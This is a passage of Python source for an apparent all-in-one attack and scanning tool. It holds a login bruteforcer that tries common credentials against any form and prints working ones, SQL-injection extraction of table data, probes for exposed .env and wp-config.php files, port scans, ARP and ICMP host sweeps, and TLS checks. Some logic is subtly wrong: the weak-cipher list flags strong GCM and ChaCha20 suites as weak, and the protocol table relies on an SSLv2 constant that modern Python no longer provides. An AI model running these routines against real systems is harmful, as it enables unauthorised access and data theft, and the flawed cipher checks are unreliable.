                    'description': f"Extracted sample data from table '{table}'",
                    'severity': 'Critical',
                    'table': table,
                    'columns': ', '.join(interesting_columns),
                    'sample_data': matches[:5],
                    'parameter': param_name
                })
                return matches
            else:
                self.typewriter_effect(f"⚠️ No data extracted from table {table}")
                return None
                
        except Exception as e:
            self.typewriter_effect(f"❌ Failed to extract data: {str(e)}")
            return None

    def comprehensive_scan(self, url):
        """Perform comprehensive security scan"""
        self.typewriter_effect(f"🕷️ Starting comprehensive security scan for: {url}")
        
        try:
            # Check if URL is valid
            parsed_url = urlparse(url)
            if not all([parsed_url.scheme, parsed_url.netloc]):
                raise ValueError("Invalid URL format")
            
            self.loading_animation("Scanning target website", 2)
            
            # Perform various security tests
            self.typewriter_effect("\n🔍 Running SQL injection test...")
            self.sql_injection_test(url)
            
            self.typewriter_effect("\n🔍 Running XSS test...")
            self.xss_test(url)
            
            # Check for common vulnerabilities
            self.typewriter_effect("\n🔍 Checking for common vulnerabilities...")
            self.check_common_vulnerabilities(url)
            
            # Check server information
            self.typewriter_effect("\n🔍 Gathering server information...")
            self.check_server_info(url)
            
            self.typewriter_effect("\n✅ Comprehensive scan completed!")
            
        except Exception as e:
            self.typewriter_effect(f"❌ Comprehensive scan failed: {str(e)}")

    def check_common_vulnerabilities(self, url):
        """Check for common web vulnerabilities"""
        try:
            # Check for directory listing
            test_url = urljoin(url, "/")
            response = self.session.get(test_url, timeout=10)
            
            if "Index of /" in response.text:
                self.typewriter_effect("\n⚠️ Directory listing enabled!")
                self.vulnerabilities.append({
                    'type': 'Directory Listing',
                    'description': 'Directory listing is enabled',
                    'severity': 'Medium',
                    'url': test_url
                })
            
            # Check for common files
            common_files = [
                'robots.txt', '.git/HEAD', '.env', 'wp-config.php',
                'config.php', 'phpinfo.php', 'test.php'
            ]
            
            for file in common_files:
                test_url = urljoin(url, file)
                response = self.session.get(test_url, timeout=5)
                
                if response.status_code == 200:
                    self.typewriter_effect(f"\n⚠️ Sensitive file accessible: {file}")
                    self.vulnerabilities.append({
                        'type': 'Sensitive File Exposure',
                        'description': f'Sensitive file accessible: {file}',
                        'severity': 'High',
                        'url': test_url
                    })
        
        except Exception as e:
            self.typewriter_effect(f"❌ Common vulnerabilities check failed: {str(e)}")

    def check_server_info(self, url):
        """Gather server information"""
        try:
            headers = self.session.head(url, timeout=10).headers
            
            server_info = {
                'Server': headers.get('Server', 'Not disclosed'),
                'X-Powered-By': headers.get('X-Powered-By', 'Not disclosed'),
                'Content-Type': headers.get('Content-Type', 'Not disclosed')
            }
            
            self.typewriter_effect("\n🛠️ Server Information:")
            for key, value in server_info.items():
                self.typewriter_effect(f"   {key}: {value}")
            
            # Check for outdated server versions
            if 'Apache' in server_info['Server'] and '2.2' in server_info['Server']:
                self.typewriter_effect("\n⚠️ Outdated Apache version detected (2.2.x is EOL)")
                self.vulnerabilities.append({
                    'type': 'Outdated Server',
                    'description': 'Outdated Apache server version detected',
                    'severity': 'High',
                    'info': server_info['Server']
                })
            
            if 'PHP' in server_info['X-Powered-By'] and '5.' in server_info['X-Powered-By']:
                self.typewriter_effect("\n⚠️ Outdated PHP version detected (5.x is EOL)")
                self.vulnerabilities.append({
                    'type': 'Outdated PHP',
                    'description': 'Outdated PHP version detected',
                    'severity': 'High',
                    'info': server_info['X-Powered-By']
                })
        
        except Exception as e:
            self.typewriter_effect(f"❌ Server information check failed: {str(e)}")

    def bruteforce_login(self, url):
        """Bruteforce login with common credentials"""
        self.typewriter_effect(f"🔓 Starting login bruteforce on: {url}")
        self.loading_animation("Preparing credential combinations", 1)
        
        try:
            # Check if URL is a login page
            response = self.session.get(url, timeout=10)
            
            # Look for login form
            soup = BeautifulSoup(response.text, 'html.parser')
            login_form = soup.find('form', {'action': lambda x: x and ('login' in x.lower() or 'signin' in x.lower())})
            
            if not login_form:
                login_form = soup.find('form')
                if not login_form:
                    raise ValueError("No login form found on page")
            
            form_details = self.get_form_details(login_form)
            form_url = urljoin(url, form_details['action'])
            
            self.typewriter_effect(f"\n🔍 Found login form at: {form_url}")
            self.typewriter_effect(f"   Method: {form_details['method'].upper()}")
            self.typewriter_effect(f"   Inputs: {', '.join([i['name'] for i in form_details['inputs']])}")
            
            # Find username and password fields
            username_field = None
            password_field = None
            
            for input_tag in form_details['inputs']:
                if input_tag['type'] == 'text' or input_tag['type'] == 'email':
                    username_field = input_tag['name']
                elif input_tag['type'] == 'password':
                    password_field = input_tag['name']
            
            if not username_field or not password_field:
                raise ValueError("Could not identify username/password fields")
            
            self.typewriter_effect(f"\n🔑 Attempting {len(self.common_creds)} common credentials...")
            
            success = False
            for username, password in self.common_creds:
                try:
                    # Prepare form data
                    form_data = {}
                    for input_tag in form_details['inputs']:
                        if input_tag['type'] == 'hidden':
                            form_data[input_tag['name']] = input_tag['value']
                        elif input_tag['name'] == username_field:
                            form_data[input_tag['name']] = username
                        elif input_tag['name'] == password_field:
                            form_data[input_tag['name']] = password
                        elif input_tag['type'] == 'submit':
                            form_data[input_tag['name']] = input_tag.get('value', '')
                    
                    # Submit the form
                    if form_details['method'] == 'post':
                        response = self.session.post(form_url, data=form_data, timeout=10)
                    else:
                        response = self.session.get(form_url, params=form_data, timeout=10)
                    
                    # Check for successful login (basic check)
                    if 'logout' in response.text.lower() or 'sign out' in response.text.lower() or 'welcome' in response.text.lower():
                        self.typewriter_effect(f"\n🎉 LOGIN SUCCESSFUL!")
                        self.typewriter_effect(f"   Username: {username}")
                        self.typewriter_effect(f"   Password: {password}")
                        
                        self.vulnerabilities.append({
                            'type': 'Weak Credentials',
                            'description': 'Login successful with common credentials',
                            'severity': 'Critical',
                            'username': username,
                            'password': password,
                            'url': form_url
                        })
                        
                        success = True
                        break
                    
                    time.sleep(0.5)  # Rate limiting
                
                except Exception as e:
                    continue
            
            if not success:
                self.typewriter_effect("\n🔐 No successful logins with common credentials")
        
        except Exception as e:
            self.typewriter_effect(f"❌ Login bruteforce failed: {str(e)}")

    def port_scan(self, target):
        """Advanced port scanning with multiple techniques"""
        try:
            # Parse target and scan type
            parts = target.split(':')
            host = parts[0]
            scan_type = parts[1] if len(parts) > 1 else 'fast'
            
            # Validate host
            try:
                socket.gethostbyname(host)
            except socket.gaierror:
                self.typewriter_effect(f"❌ Invalid host: {host}")
                return
            
            scan_options = {
                'fast': self.fast_port_scan,
                'full': self.full_port_scan,
                'service': self.service_detection_scan,
                'udp': self.udp_port_scan,
                'os': self.os_detection_scan
            }
            
            if scan_type not in scan_options:
                self.typewriter_effect(f"❌ Unknown scan type: {scan_type}. Available: fast, full, service, udp, os")
                return
            
            self.typewriter_effect(f"🌐 Starting {scan_type} scan on: {host}")
            scan_options[scan_type](host)
            
        except Exception as e:
            self.typewriter_effect(f"❌ Port scan failed: {str(e)}")
    
    def fast_port_scan(self, host):
        """Fast scan of common ports"""
        config = self.port_scan_options['fast_scan']
        self.typewriter_effect(f"⚡ Fast scanning top {len(config['ports'])} ports on {host}")
        
        open_ports = []
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=config['threads']) as executor:
            futures = {executor.submit(self.check_port, host, port, config['timeout'], 'tcp'): port for port in config['ports']}
            
            for future in as_completed(futures):
                port = futures[future]
                try:
                    is_open, protocol, banner = future.result()
                    if is_open:
                        open_ports.append((port, protocol, banner))
                        self.typewriter_effect(f"   ✅ {port}/tcp - {protocol} {f'- {banner}' if banner else ''}")
                except Exception as e:
                    continue
        
        duration = time.time() - start_time
        self.typewriter_effect(f"\n🔍 Scan completed in {duration:.2f} seconds")
        self.typewriter_effect(f"📊 Found {len(open_ports)} open ports")
        
        if open_ports:
            self.vulnerabilities.append({
                'type': 'Open Ports - Fast Scan',
                'description': f'Found {len(open_ports)} open ports on {host}',
                'severity': 'Info',
                'host': host,
                'ports': [f"{p[0]}/tcp - {p[1]}" for p in open_ports],
                'banners': [p[2] for p in open_ports if p[2]]
            })
            
            # Check for vulnerable services
            self.check_vulnerable_services(host, open_ports)
    
    def full_port_scan(self, host):
        """Full port scan (1-65535)"""
        config = self.port_scan_options['full_scan']
        self.typewriter_effect(f"🔍 Full scanning all 65535 ports on {host} (this may take a while)")
        
        open_ports = []
        start_time = time.time()
        scanned = 0
        total_ports = len(config['ports'])
        
        # Split ports into chunks for progress reporting
        chunk_size = 1000
        port_chunks = [config['ports'][i:i + chunk_size] for i in range(0, total_ports, chunk_size)]
        
        for chunk in port_chunks:
            chunk_open = []
            with ThreadPoolExecutor(max_workers=config['threads']) as executor:
                futures = {executor.submit(self.check_port, host, port, config['timeout'], 'tcp'): port for port in chunk}
                
                for future in as_completed(futures):
                    port = futures[future]
                    scanned += 1
                    try:
                        is_open, protocol, banner = future.result()
                        if is_open:
                            chunk_open.append((port, protocol, banner))
                            self.typewriter_effect(f"   ✅ {port}/tcp - {protocol} {f'- {banner}' if banner else ''}")
                    except Exception as e:
                        continue
            
            open_ports.extend(chunk_open)
            progress = (scanned / total_ports) * 100
            self.typewriter_effect(f"\r🔄 Progress: {progress:.1f}% ({scanned}/{total_ports})", speed=0)
        
        duration = time.time() - start_time
        self.typewriter_effect(f"\n🔍 Scan completed in {duration:.2f} seconds")
        self.typewriter_effect(f"📊 Found {len(open_ports)} open ports")
        
        if open_ports:
            self.vulnerabilities.append({
                'type': 'Open Ports - Full Scan',
                'description': f'Found {len(open_ports)} open ports on {host}',
                'severity': 'Info',
                'host': host,
                'ports': [f"{p[0]}/tcp - {p[1]}" for p in open_ports],
                'banners': [p[2] for p in open_ports if p[2]]
            })
            
            # Check for vulnerable services
            self.check_vulnerable_services(host, open_ports)
    
    def service_detection_scan(self, host):
        """Service detection scan with banner grabbing"""
        config = self.port_scan_options['service_scan']
        self.typewriter_effect(f"🔍 Service detection scan on {host}")
        
        open_ports = []
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=config['threads']) as executor:
            futures = {executor.submit(self.check_port, host, port, config['timeout'], 'tcp', True): port for port in config['ports']}
            
            for future in as_completed(futures):
                port = futures[future]
                try:
                    is_open, protocol, banner = future.result()
                    if is_open:
                        open_ports.append((port, protocol, banner))
                        self.typewriter_effect(f"   ✅ {port}/tcp - {protocol} {f'- {banner}' if banner else ''}")
                except Exception as e:
                    continue
        
        duration = time.time() - start_time
        self.typewriter_effect(f"\n🔍 Scan completed in {duration:.2f} seconds")
        self.typewriter_effect(f"📊 Found {len(open_ports)} open ports with service detection")
        
        if open_ports:
            self.vulnerabilities.append({
                'type': 'Service Detection',
                'description': f'Service detection on {len(open_ports)} ports on {host}',
                'severity': 'Info',
                'host': host,
                'services': [f"{p[0]}/tcp - {p[1]}" for p in open_ports],
                'banners': [p[2] for p in open_ports if p[2]]
            })
            
            # Check for vulnerable services
            self.check_vulnerable_services(host, open_ports)
    
    def udp_port_scan(self, host):
        """UDP port scan"""
        config = self.port_scan_options['udp_scan']
        self.typewriter_effect(f"🔍 UDP scanning {len(config['ports'])} ports on {host}")
        
        open_ports = []
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=config['threads']) as executor:
            futures = {executor.submit(self.check_port, host, port, config['timeout'], 'udp'): port for port in config['ports']}
            
            for future in as_completed(futures):
                port = futures[future]
                try:
                    is_open, protocol, banner = future.result()
                    if is_open:
                        open_ports.append((port, protocol, banner))
                        self.typewriter_effect(f"   ✅ {port}/udp - {protocol} {f'- {banner}' if banner else ''}")
                except Exception as e:
                    continue
        
        duration = time.time() - start_time
        self.typewriter_effect(f"\n🔍 Scan completed in {duration:.2f} seconds")
        self.typewriter_effect(f"📊 Found {len(open_ports)} open UDP ports")
        
        if open_ports:
            self.vulnerabilities.append({
                'type': 'Open UDP Ports',
                'description': f'Found {len(open_ports)} open UDP ports on {host}',
                'severity': 'Info',
                'host': host,
                'ports': [f"{p[0]}/udp - {p[1]}" for p in open_ports],
                'banners': [p[2] for p in open_ports if p[2]]
            })
    
    def os_detection_scan(self, host):
        """OS detection scan using Nmap"""
        self.typewriter_effect(f"🔍 Starting OS detection scan on {host}")
        
        try:
            nm = nmap.PortScanner()
            nm.scan(hosts=host, arguments='-O')
            
            if host in nm.all_hosts():
                host_info = nm[host]
                
                if 'osmatch' in host_info:
                    self.typewriter_effect("\n🖥️ Possible OS Matches:")
                    for os_match in host_info['osmatch'][:3]:  # Show top 3 matches
                        self.typewriter_effect(f"   {os_match['name']} (Accuracy: {os_match['accuracy']}%)")
                    
                    self.vulnerabilities.append({
                        'type': 'OS Detection',
                        'description': 'Operating system detection results',
                        'severity': 'Info',
                        'host': host,
                        'os_matches': [{'name': m['name'], 'accuracy': m['accuracy']} for m in host_info['osmatch'][:3]]
                    })
                else:
                    self.typewriter_effect("❌ Could not detect OS")
                
                # Show open ports if any were found during the scan
                if 'tcp' in host_info:
                    self.typewriter_effect("\n🔍 Open ports found during OS detection:")
                    for port in host_info['tcp']:
                        state = host_info['tcp'][port]['state']
                        if state == 'open':
                            service = host_info['tcp'][port]['name']
                            self.typewriter_effect(f"   {port}/tcp - {service}")
            else:
                self.typewriter_effect("❌ Host not reachable for OS detection")
        
        except Exception as e:
            self.typewriter_effect(f"❌ OS detection failed: {str(e)}")
    
    def host_discovery(self, network_range):
        """Network host discovery using ARP and ICMP"""
        self.typewriter_effect(f"🔍 Starting host discovery on network: {network_range}")
        
        try:
            # Validate network range
            try:
                network = ipaddress.ip_network(network_range)
            except ValueError:
                self.typewriter_effect("❌ Invalid network range format. Use CIDR notation (e.g., 192.168.1.0/24)")
                return
            
            if network.prefixlen < 16:
                confirm = input(f"⚠️ Scanning a large network ({network.num_addresses} hosts). Continue? (yes/no): ")
                if confirm.lower() != 'yes':
                    return
            
            alive_hosts = []
            
            # ARP scan for local network discovery
            self.typewriter_effect("\n🔍 Performing ARP scan...")
            arp_hosts = self.arp_scan(network)
            alive_hosts.extend(arp_hosts)
            
            # ICMP ping sweep for additional hosts
            self.typewriter_effect("\n🔍 Performing ICMP ping sweep...")
            icmp_hosts = self.icmp_sweep(network)
            alive_hosts.extend(h for h in icmp_hosts if h not in alive_hosts)
            
            # Remove duplicates and sort
            alive_hosts = sorted(list(set(alive_hosts)))
            
            self.typewriter_effect("\n🖥️ Alive hosts found:")
            for host in alive_hosts:
                try:
                    hostname = socket.gethostbyaddr(host)[0]
                    self.typewriter_effect(f"   {host} ({hostname})")
                except:
                    self.typewriter_effect(f"   {host}")
            
            self.vulnerabilities.append({
                'type': 'Host Discovery',
                'description': f'Found {len(alive_hosts)} alive hosts on {network_range}',
                'severity': 'Info',
                'network': network_range,
                'hosts': alive_hosts
            })
            
        except Exception as e:
            self.typewriter_effect(f"❌ Host discovery failed: {str(e)}")
    
    def arp_scan(self, network):
        """ARP scan for local network host discovery"""
        hosts = []
        
        try:
            # Create ARP request packet
            arp_request = scapy.ARP(pdst=str(network))
            broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast/arp_request
            
            # Send and receive packets with timeout
            answered = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
            
            for element in answered:
                hosts.append(element[1].psrc)
        
        except Exception as e:
            self.typewriter_effect(f"⚠️ ARP scan failed: {str(e)}")
        
        return hosts
    
    def icmp_sweep(self, network):
        """ICMP ping sweep for host discovery"""
        hosts = []
        
        try:
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(self.check_host_icmp, str(host)): host for host in network.hosts()}
                
                for future in as_completed(futures):
                    host = futures[future]
                    try:
                        if future.result():
                            hosts.append(str(host))
                            self.typewriter_effect(f"\r🖥️ Found alive host: {host}", speed=0)
                    except:
                        continue
        
        except Exception as e:
            self.typewriter_effect(f"⚠️ ICMP sweep failed: {str(e)}")
        
        return hosts
    
    def check_host_icmp(self, host):
        """Check if host responds to ICMP ping"""
        try:
            # Linux/Mac
            if os.name == 'posix':
                response = subprocess.run(['ping', '-c', '1', '-W', '1', host], 
                                        stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE).returncode
                return response == 0
            # Windows
            else:
                response = subprocess.run(['ping', '-n', '1', '-w', '1000', host], 
                                        stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE).returncode
                return response == 0
        except:
            return False
    
    def check_port(self, host, port, timeout=1, protocol='tcp', grab_banner=False):
        """Check if a port is open and optionally grab banner"""
        try:
            if protocol == 'tcp':
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(timeout)
                    result = s.connect_ex((host, port))
                    
                    if result == 0:
                        # Port is open, try to get service banner
                        banner = ''
                        if grab_banner:
                            try:
                                s.send(b'GET / HTTP/1.0\r\n\r\n')
                                banner = s.recv(1024).decode('utf-8', 'ignore').strip()
                                if banner:
                                    banner = banner.split('\n')[0]  # Get first line
                            except:
                                pass
                        
                        # Try to get service name
                        try:
                            service = socket.getservbyport(port, 'tcp')
                        except:
                            service = 'unknown'
                        
                        return True, service, banner
            elif protocol == 'udp':
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.settimeout(timeout)
                    
                    # Send dummy data to UDP port (some services respond)
                    try:
                        s.sendto(b'\x00', (host, port))
                        data, _ = s.recvfrom(1024)
                        if data:
                            try:
                                service = socket.getservbyport(port, 'udp')
                            except:
                                service = 'unknown'
                            return True, service, data.decode('utf-8', 'ignore').strip()
                    except:
                        pass
                    
                    # For some UDP ports, we can check if they're "open" by binding to them
                    try:
                        s.bind(('', port))
                        s.close()
                        return False, '', ''
                    except:
                        try:
                            service = socket.getservbyport(port, 'udp')
                        except:
                            service = 'unknown'
                        return True, service, ''
        
        except Exception as e:
            pass
        
        return False, '', ''
    
    def check_vulnerable_services(self, host, open_ports):
        """Check for services with known vulnerabilities"""
        vulnerable_services = []
        
        for port, protocol, banner in open_ports:
            if not banner:
                continue
                
            # Normalize protocol name
            protocol = protocol.lower()
            if protocol in ['http', 'https']:
                protocol = 'http'
            elif protocol in ['microsoft-ds', 'netbios-ssn']:
                protocol = 'smb'
            
            # Check against known vulnerable banners
            if protocol in self.vulnerable_banners:
                for vuln_banner, vuln_desc in self.vulnerable_banners[protocol].items():
                    if vuln_banner.lower() in banner.lower():
                        vulnerable_services.append((port, protocol, vuln_banner, vuln_desc))
                        self.typewriter_effect(f"\n⚠️ POTENTIAL VULNERABILITY: {port}/{protocol}")
                        self.typewriter_effect(f"   Service: {banner}")
                        self.typewriter_effect(f"   Possible issue: {vuln_desc}")
        
        if vulnerable_services:
            self.vulnerabilities.append({
                'type': 'Vulnerable Services',
                'description': 'Services with potential vulnerabilities found',
                'severity': 'High',
                'host': host,
                'services': [f"{p[0]}/{p[1]}" for p in vulnerable_services],
                'vulnerabilities': [f"{p[3]} (Detected: {p[2]})" for p in vulnerable_services]
            })
    
    def ssl_check(self, host):
        """Enhanced SSL/TLS configuration check with certificate analysis"""
        self.typewriter_effect(f"🔒 Starting ENHANCED SSL/TLS check for: {host}")
        
        try:
            # First check if port 443 is open
            try:
                with socket.create_connection((host, 443), timeout=5):
                    pass
            except:
                self.typewriter_effect("❌ Port 443 is not open")
                return
            
            # Create SSL context with more options
            context = ssl.create_default_context()
            context.set_ciphers('ALL:@SECLEVEL=1')
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            
            # Get certificate info using cryptography
            cert_info = self.get_certificate_info(host)
            
            if cert_info:
                self.typewriter_effect("\n🛠️ SSL Certificate Information:")
                self.typewriter_effect(f"   Subject: {cert_info['subject']}")
                self.typewriter_effect(f"   Issuer: {cert_info['issuer']}")
                self.typewriter_effect(f"   Serial: {cert_info['serial']}")
                self.typewriter_effect(f"   Valid From: {cert_info['not_before']}")
                self.typewriter_effect(f"   Valid Until: {cert_info['not_after']}")
                self.typewriter_effect(f"   Expires In: {cert_info['expires_in']} days")
                self.typewriter_effect(f"   Signature Algorithm: {cert_info['signature_algorithm']}")
                self.typewriter_effect(f"   Public Key: {cert_info['public_key']}")
                self.typewriter_effect(f"   Key Size: {cert_info['key_size']} bits")
                self.typewriter_effect(f"   DNS Names: {', '.join(cert_info['dns_names'])}")
                
                # Check certificate expiration
                if cert_info['expires_in'] < 30:
                    self.typewriter_effect(f"\n⚠️ Certificate expires in {cert_info['expires_in']} days!")
                    self.vulnerabilities.append({
                        'type': 'SSL Certificate Expiry',
                        'description': f"Certificate expires in {cert_info['expires_in']} days",
                        'severity': 'Medium',
                        'host': host,
                        'expiry': cert_info['not_after']
                    })
                
                # Check key size
                if cert_info['key_size'] < 2048:
                    self.typewriter_effect(f"\n⚠️ Weak RSA key size detected: {cert_info['key_size']} bits (should be at least 2048)")
                    self.vulnerabilities.append({
                        'type': 'Weak RSA Key',
                        'description': f'Weak RSA key size: {cert_info["key_size"]} bits',
                        'severity': 'High',
                        'host': host
                    })
            
            # Check supported protocols
            self.typewriter_effect("\n🔍 Testing supported protocols...")
            protocols = self.test_ssl_protocols(host)
            if protocols:
                self.typewriter_effect("   Supported Protocols:")
                for proto, version in protocols.items():
                    self.typewriter_effect(f"   {proto}: {version}")
                
                # Check for weak protocols
                if 'SSLv2' in protocols or 'SSLv3' in protocols:
                    weak_protos = [p for p in ['SSLv2', 'SSLv3'] if p in protocols]
                    self.typewriter_effect(f"\n⚠️ Weak protocols enabled: {', '.join(weak_protos)}")
                    self.vulnerabilities.append({
                        'type': 'Weak SSL Protocol',
                        'description': f'Weak protocols enabled: {", ".join(weak_protos)}',
                        'severity': 'High',
                        'host': host
                    })
            
            # Check cipher suites
            self.typewriter_effect("\n🔍 Testing cipher suites...")
            good_ciphers, weak_ciphers = self.test_cipher_suites(host)
            
            if good_ciphers:
                self.typewriter_effect("\n✅ Strong cipher suites:")
                for cipher in good_ciphers[:5]:  # Show first 5 strong ciphers
                    self.typewriter_effect(f"   {cipher}")
                if len(good_ciphers) > 5:
                    self.typewriter_effect(f"   ... and {len(good_ciphers)-5} more")
            
            if weak_ciphers:
                self.typewriter_effect("\n⚠️ Weak cipher suites:")
                for cipher in weak_ciphers[:5]:  # Show first 5 weak ciphers
                    self.typewriter_effect(f"   {cipher}")
                if len(weak_ciphers) > 5:
                    self.typewriter_effect(f"   ... and {len(weak_ciphers)-5} more")
                
                self.vulnerabilities.append({
                    'type': 'Weak Cipher Suites',
                    'description': f'{len(weak_ciphers)} weak cipher suites enabled',
                    'severity': 'High',
                    'host': host,
                    'weak_ciphers': weak_ciphers[:10]  # Store first 10 weak ciphers
                })
            
            # Check for Heartbleed vulnerability
            self.typewriter_effect("\n🔍 Checking for Heartbleed vulnerability...")
            if self.check_heartbleed(host):
                self.typewriter_effect("💔 HEARTBLEED VULNERABILITY DETECTED!")
                self.vulnerabilities.append({
                    'type': 'Heartbleed',
                    'description': 'OpenSSL Heartbleed vulnerability detected',
                    'severity': 'Critical',
                    'host': host
                })
            else:
                self.typewriter_effect("✅ No Heartbleed vulnerability detected")
            
            # Check for POODLE vulnerability
            self.typewriter_effect("\n🔍 Checking for POODLE vulnerability...")
            if 'SSLv3' in protocols:
                self.typewriter_effect("⚠️ POODLE VULNERABILITY POSSIBLE (SSLv3 enabled)")
                self.vulnerabilities.append({
                    'type': 'POODLE',
                    'description': 'POODLE vulnerability possible (SSLv3 enabled)',
                    'severity': 'High',
                    'host': host
                })
            else:
                self.typewriter_effect("✅ No POODLE vulnerability detected")
            
            # Check for CRIME vulnerability
            self.typewriter_effect("\n🔍 Checking for CRIME vulnerability...")
            if self.check_crime_vulnerability(host):
                self.typewriter_effect("⚠️ CRIME VULNERABILITY POSSIBLE (TLS compression enabled)")
                self.vulnerabilities.append({
                    'type': 'CRIME',
                    'description': 'CRIME vulnerability possible (TLS compression enabled)',
                    'severity': 'Medium',
                    'host': host
                })
            else:
                self.typewriter_effect("✅ No CRIME vulnerability detected")
            
            # Check for BEAST vulnerability
            self.typewriter_effect("\n🔍 Checking for BEAST vulnerability...")
            beast_vuln = False
            if 'TLSv1.0' in protocols:
                for cipher in weak_ciphers:
                    if 'CBC' in cipher:
                        beast_vuln = True
                        break
            
            if beast_vuln:
                self.typewriter_effect("⚠️ BEAST VULNERABILITY POSSIBLE (TLS 1.0 with CBC cipher)")
                self.vulnerabilities.append({
                    'type': 'BEAST',
                    'description': 'BEAST vulnerability possible (TLS 1.0 with CBC cipher)',
                    'severity': 'Medium',
                    'host': host
                })
            else:
                self.typewriter_effect("✅ No BEAST vulnerability detected")
            
            # Check for FREAK vulnerability
            self.typewriter_effect("\n🔍 Checking for FREAK vulnerability...")
            if self.check_freak_vulnerability(host):
                self.typewriter_effect("⚠️ FREAK VULNERABILITY DETECTED (Export cipher supported)")
                self.vulnerabilities.append({
                    'type': 'FREAK',
                    'description': 'FREAK vulnerability detected (Export cipher supported)',
                    'severity': 'High',
                    'host': host
                })
            else:
                self.typewriter_effect("✅ No FREAK vulnerability detected")
            
            # Check for LOGJAM vulnerability
            self.typewriter_effect("\n🔍 Checking for LOGJAM vulnerability...")
            if self.check_logjam_vulnerability(host):
                self.typewriter_effect("⚠️ LOGJAM VULNERABILITY DETECTED (DH EXPORT cipher supported)")
                self.vulnerabilities.append({
                    'type': 'LOGJAM',
                    'description': 'LOGJAM vulnerability detected (DH EXPORT cipher supported)',
                    'severity': 'High',
                    'host': host
                })
            else:
                self.typewriter_effect("✅ No LOGJAM vulnerability detected")
            
            # Check for DROWN vulnerability
            self.typewriter_effect("\n🔍 Checking for DROWN vulnerability...")
            if self.check_drown_vulnerability(host):
                self.typewriter_effect("💀 DROWN VULNERABILITY DETECTED (SSLv2 enabled)")
                self.vulnerabilities.append({
                    'type': 'DROWN',
                    'description': 'DROWN vulnerability detected (SSLv2 enabled)',
                    'severity': 'Critical',
                    'host': host
                })
            else:
                self.typewriter_effect("✅ No DROWN vulnerability detected")
            
            # Overall rating
            vuln_count = sum(1 for v in self.vulnerabilities if v['host'] == host)
            if vuln_count == 0:
                self.typewriter_effect("\n🔒 SSL/TLS configuration is STRONG - no vulnerabilities found")
            elif vuln_count <= 2:
                self.typewriter_effect(f"\n⚠️ SSL/TLS configuration has {vuln_count} vulnerabilities - needs improvement")
            else:
                self.typewriter_effect(f"\n💀 SSL/TLS configuration has {vuln_count} CRITICAL vulnerabilities - immediate action required")
        
        except Exception as e:
            self.typewriter_effect(f"❌ SSL check failed: {str(e)}")

    def get_certificate_info(self, host):
        """Get detailed certificate information using cryptography"""
        try:
            cert_pem = ssl.get_server_certificate((host, 443))
            cert = x509.load_pem_x509_certificate(cert_pem.encode(), default_backend())
            
            # Get subject
            subject = {}
            for attr in cert.subject:
                subject[attr.oid._name] = attr.value
            subject_str = ', '.join(f"{k}={v}" for k, v in subject.items())
            
            # Get issuer
            issuer = {}
            for attr in cert.issuer:
                issuer[attr.oid._name] = attr.value
            issuer_str = ', '.join(f"{k}={v}" for k, v in issuer.items())
            
            # Get validity
            not_before = cert.not_valid_before.strftime('%Y-%m-%d %H:%M:%S')
            not_after = cert.not_valid_after.strftime('%Y-%m-%d %H:%M:%S')
            expires_in = (cert.not_valid_after - datetime.now()).days
            
            # Get public key info
            public_key = cert.public_key()
            if isinstance(public_key, cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey):
                key_type = "RSA"
                key_size = public_key.key_size
            elif isinstance(public_key, cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicKey):
                key_type = "EC"
                key_size = public_key.curve.key_size
            else:
                key_type = "Unknown"
                key_size = 0
            
            # Get DNS names
            dns_names = []
            try:
                ext = cert.extensions.get_extension_for_class(x509.SubjectAlternativeName)
                dns_names = ext.value.get_values_for_type(x509.DNSName)
            except x509.ExtensionNotFound:
                pass
            
            return {
                'subject': subject_str,
                'issuer': issuer_str,
                'serial': cert.serial_number,
                'not_before': not_before,
                'not_after': not_after,
                'expires_in': expires_in,
                'signature_algorithm': cert.signature_algorithm_oid._name,
                'public_key': key_type,
                'key_size': key_size,
                'dns_names': dns_names
            }
        except Exception as e:
            self.typewriter_effect(f"❌ Failed to get certificate info: {str(e)}")
            return None
    
    def test_ssl_protocols(self, host):
        """Test which SSL/TLS protocols are supported"""
        protocols = {
            'SSLv2': ssl.PROTOCOL_SSLv2,
            'SSLv3': ssl.PROTOCOL_SSLv3,
            'TLSv1': ssl.PROTOCOL_TLSv1,
            'TLSv1.1': ssl.PROTOCOL_TLSv1_1,
            'TLSv1.2': ssl.PROTOCOL_TLSv1_2,
            'TLSv1.3': ssl.PROTOCOL_TLS  # In Python 3.7+, this enables TLS 1.3 if available
        }
        
        supported = {}
        
        for name, proto in protocols.items():
            try:
                context = ssl.SSLContext(proto)
                context.verify_mode = ssl.CERT_NONE
                context.check_hostname = False
                
                with socket.create_connection((host, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        # Get actual protocol version negotiated
                        version = ssock.version()
                        supported[name] = version
            except:
                continue
        
        return supported
    
    def test_cipher_suites(self, host):
        """Test which cipher suites are supported"""
        good_ciphers = []
        weak_ciphers = []
        
        # Test each cipher suite
        for cipher in self.cipher_suites:
            try:
                context = ssl.SSLContext(ssl.PROTOCOL_TLS)
                context.set_ciphers(cipher)
                context.verify_mode = ssl.CERT_NONE
                context.check_hostname = False
                
                with socket.create_connection((host, 443)) as sock:
                    with context.wrap_socket(sock, server_hostname=host) as ssock:
                        # Check if cipher is weak
                        if self.is_cipher_weak(cipher):
                            weak_ciphers.append(cipher)
                        else:
                            good_ciphers.append(cipher)
            except:
                continue
        
        return good_ciphers, weak_ciphers
    
    def is_cipher_weak(self, cipher):
        """Determine if a cipher suite is weak"""
        weak_keywords = [
            'NULL', 'EXPORT', 'DES', 'RC2', 'RC4', 'MD5', 
            'PSK', 'SRP', 'KRB5', 'IDEA', 'SEED', 'CAMELLIA',
            '3DES', 'ANON', 'CHACHA20', 'GCM', 'POLY1305'
        ]
        
        # First check protocol version
        protocol = self.cipher_suites.get(cipher, '')
